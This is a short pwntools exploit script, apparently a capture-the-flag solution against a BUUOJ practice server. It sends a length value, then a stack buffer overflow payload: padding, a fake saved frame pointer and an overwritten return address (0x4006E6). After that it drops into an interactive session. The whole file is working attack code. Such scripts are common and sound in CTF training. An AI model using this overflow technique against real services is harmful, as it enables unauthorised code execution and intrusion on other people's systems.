from pwn import *

context.log_level='debug'

p=remote('node5.buuoj.cn',29875)

p.recvuntil(b'name:\n')

payload1=b'40'

p.sendline(payload1)

p.recvuntil(b'name?\n')

payload2=b'a'*(0x10)+p64(0)+p64(0x4006E6)

p.sendline(payload2)

p.interactive()